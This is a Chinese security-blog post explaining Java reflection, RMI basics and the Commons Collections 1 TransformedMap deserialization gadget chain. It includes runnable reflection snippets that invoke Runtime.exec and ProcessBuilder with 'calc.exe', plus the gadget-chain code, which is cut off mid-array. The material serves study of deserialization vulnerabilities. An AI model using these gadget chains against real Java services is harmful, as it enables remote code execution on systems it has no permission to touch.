---
title: JAVA TransforMap&LazyMap链
url: https://buaq.net/go-136379.html
source: unSafe.sh - 不安全
date: 2022-11-20
fetch_date: 2025-10-03T23:16:30.652359
---

# JAVA TransforMap&LazyMap链

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/deaea3a65dfc40243d6a8354fa46e6b8.jpg)

JAVA TransforMap&LazyMap链

首先，反射通常是通过class方法生成的class对象，所以可以使用比如runtime下没有而class下有的方法。比如序列化，runtime是生成对象是无法序列化
*2022-11-19 18:26:0
Author: [xz.aliyun.com(查看原文)](/jump-136379.htm)
阅读量:23
收藏*

---

首先，反射通常是通过class方法生成的class对象，所以可以使用比如runtime下没有而class下有的方法。比如序列化，runtime是生成对象是无法序列化的，但是class可以。所以一般都要通过class进行反序列化

## getMethod利用实例化对象方法实例化对象

* 方法.invoke(对象，参数)调用该对象下的方法

Runtime下的构造函数是私有的，只能通过Runtime.getRuntime()来获取Runtime对象。

* getMethod通过反射获取一个类的公有方法（因为重载的存在不能直接确定函数）。而invoke和getMethod的区别就是invoke会执行函数。

```
Class clazz = Class.forName("java.lang.Runtime");
Method execMethod = clazz.getMethod("exec", String.class);
Method getRuntimeMethod = clazz.getMethod("getRuntime");
Object runtime = getRuntimeMethod.invoke(clazz);
execMethod.invoke(runtime, "calc.exe");
```

所以上述代码就是，用forName获取Runtime类并命名为clazz，用getMethod获取clazz类里的exec方法(因为exec有6个重载的原因要加string.class参数)并命名为execMethod，用getMethod获取getRuntime方法并命名为getRuntimeMethod，用getRuntimeMethod方法获取Runtime的对象，invoke执行clazz类下的getRuntimeMethod方法（也就是生成对象）并命名为runtime。最好invoke执行runtime对象的exec方法，并传入参数calc.exe。也就是打开计算器。

## getConstructor利用构造函数实例化对象

该方法实例化需要构造函数公有

* newInstance实例化类对象
* getConstructor获取**具有指定参数类型的指定类构造函数**。

```
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```

forName获取ProcessBuilder类，用getMethod获取start方法。

但是ProcessBuilder的构造函数参数有`List<string>`或者`string...`。

`...`表示不确定参数个数，在底层为一个数组，所以可以直接传数组参数

* 如果要获取`List<string>`参数的构造函数，可以用List强制类型转化后传参

invoke调用getConstructor获取构造函数，然后用newInstance实例化类对象时就会调用构造函数。newInstance的参数calc.exe会作为参数传递给构造函数，然后start共享参数执行命令。即`clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))`是向构造函数传calc.exe参实例化对象

* 如果要执行`string...`格式的构造函数，就是要传`String[].class`

```
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
```

因为newInstance也是接收变长参数，getConstructor也是接收变长参数，所以要传二维数组

那构造函数私有呢？

## getDeclaredMethod或getDeclaredConstruct获取私有构造函数实例化对象

上面两种方法由于`getMethod`和`getConstruct`是获取类的所有**公共**方法，包括继承。所以不能获取到私有和保护方法。但是`getDeclaredMethod`和`getDeclaredConstruct`是获取声明（写）在类的方法，就能**获取到私有和保护方法**，但是不能获取继承方法

```
Class clazz = Class.forName("java.lang.Runtime");
Constructor m = clazz.getDeclaredConstructor();
m.setAccessible(true);
clazz.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe")
```

必须写setAccessible修改作用域。因为Runtime有无参构造函数的原因，getDeclaredConstructor可以不加参数。不像ProcessBuilder有两个构造函数而且都有参数

RMI为远程方法调用.过程有三方参与，分别为Registry,Server,Client。如果学过可信计算，可以把Registry理解为可信第三方

```
LocateRegistry.createRegistry(1099);
Naming.bind("rmi://127.0.0.1:1099/Hello", new RemoteHelloWorld());
```

创建Registry并绑定RemoteHelloworld对象到Hello名字上。Naming.bind第一个参数是url（rmi://host:port/name)，name为远程对象的名字。本地运行时socket默认为localhost:1099。

而在远程用Naming.rebind重新绑定对象是不行的，只有url ip为localhost才能直接调用rebind\bind等方法。（ip必须为服务器ip才能远程访问）

* list搭配lookup进行远程调用。List列出所有绑定对象后用lookup获取指定对象(BaRMIe探测危险方法)
* applet的codebase标签RMI

`readObject`：和`php __wakeup`类似

```
package org.vulhub.Ser;
import java.io.IOException;

public class Person implements java.io.Serializable {
    public String name;
    public int age;
    Person(String name, int age) {
        this.name = name;
        this.age = age;
    }
    private void writeObject(java.io.ObjectOutputStream s) throws IOException {
        s.defaultWriteObject();
        s.writeObject("This is a object");
    }
    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        String message = (String) s.readObject();
        System.out.println(message);
    }
}
```

序列化对象时会调用writeObject方法写入内容，参数类型为ObjectOutputStream。反序列化时会调用readObject读取流，该流可以进行利用以读取前面写入的内容（也可以其他利用）

defaultWriteObject将对象可序列化字段写入输出流，也就是序列化。

s.writeObject把字符串写入流中。read同理

在代码进行到中间，也就是writeObject完的时候用SerializationDumper查看数据时发现写入的字符串放在`objectAnnotation`的位置

* objectAnnotation:序列化时开发者写入的内容会放在objectAnnotation中。readObject反序列时会读取写入内容（不用考虑类属性，任意东西都能写入）

![](https://xzfile.aliyuncs.com/media/upload/picture/20221119182419-5425a11c-67f4-1.png)

readObject读取写入内容后传入message，printIn输出

在URLDNS利用链里用到了hashmap，主要原因就是hashmap继承了Serializable接口

## Common-collections1 TransformMap版

下面对p神编写的简化版commoncollections1的利用链

```
package org.vulhub.Ser;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
public static void main(String[] args) throws Exception {
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.getRuntime()),
new InvokerTransformer("exec", new Class[]{String.class},
new Object[]
{"calc.exe"}),
};
Transformer transformerChain = new
ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null,
transformerChain);
outerMap.put("test", "xxxx");
}
}
```

用Transformer[]定义了transformers接口，transformers接收两个参数，分别为ConstantTransformer(构造函数时传入对象并返回该对象)，InvokerTransformer(执行任意方法)。

* InvokerTransformer接收三个参数，命令执行方法，函数参数类型，参数列表。参数类型参照前面的exec不同构造构造函数。这里选择的String.class也就是字符对象。
* InvokerTransformer用getClass，getMethod后用invoke执行了方法。

```
Class cls = input.getClass();
Method method = cls.getMethod(iMethodName, iParamTypes);
return method.invoke(input, iArgs);
```

ChainedTransformer将前一个回调返回结果作为后一个回调参数，现在你就知道了为什么transformers定义时传入了两个对象了，getRuntime获取的对象经过ConstantTransformer返回后作为参数传到InvokerTransformer里。因为Runtime里才有exec方法

而decorate方法是获取一个TransformedMap对象，当TransformedMap内的key和value变化时就会触发Transformer的transform()方法。 在这里也就是把transformerChain绑定在value或者key上。后续put进新元素时会改变transformvalue或者key进而触发反序列化链。

触发过程：put新元素触发hashmap的反序列化，并且transformChain开始生成runtime对象，exec执行

但是现实环境几乎没有能直接put元素的环境。需要在java原生环境找到put类操作，也就是sun.reflect.annotation.AnnotationInvocationHandler。AnnotationInvocationHandler的readObject方法里有memberValue.setValue()，在序列化时会直接触发。所以只需要把Map传进去就行了。但是这个方法是私有的，还需要反射获取

```
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(obj);
oos.close();
```

由于网络传输需要用字节流而不是字符流，就需要先ByteOutputStream创建字节数组缓存区，再创建对象的序列化流后用writeObject写入序列化流。

但是执行不了，上述代码对象是由Runtime.getRuntime()实例化对象方法直接生成的。继承的是Runtime的方法，但是该类下没有serializable接口进行序列化。从开篇提的class反射生成的类具有serializable接口，所以这里要借助class进行反射。(对象具有serializable接口才能反序列化，而反序列化是从readObject入口)

所以反序列化链为：

```
package org.vulhub.Ser;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
        new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class },
        new String[] {
        "ca...